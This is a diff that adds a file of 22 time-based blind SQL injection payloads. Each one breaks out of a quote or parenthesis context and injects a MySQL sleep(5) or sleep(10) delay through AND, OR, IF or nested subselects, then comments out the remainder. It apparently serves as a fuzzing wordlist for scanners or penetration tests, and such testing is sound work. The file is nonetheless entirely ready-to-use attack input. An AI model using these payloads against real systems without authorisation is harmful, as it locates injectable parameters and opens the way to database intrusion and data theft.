@@ -1,0 +1,22 @@
+1' and sleep(5)--
+1' and sleep(10)--
+1" and sleep(5)--
+1" and sleep(10)--
+1) and sleep(5)--
+1) and sleep(10)--
+1') and sleep(5)--
+1') and sleep(10)--
+1")) and sleep(5)--
+1")) and sleep(10)--
+'; sleep(5)--
+"; sleep(5)--
+'); sleep(5)--
+"); sleep(5)--
+1' or sleep(5)--
+1" or sleep(5)--
+1' or if(1=1,sleep(5),0)--
+1" or if(1=1,sleep(5),0)--
+1' and (select sleep(5))--
+1" and (select sleep(5))--
+1' and (select 1 from (select sleep(5))a)--
+1" and (select 1 from (select sleep(5))a)--
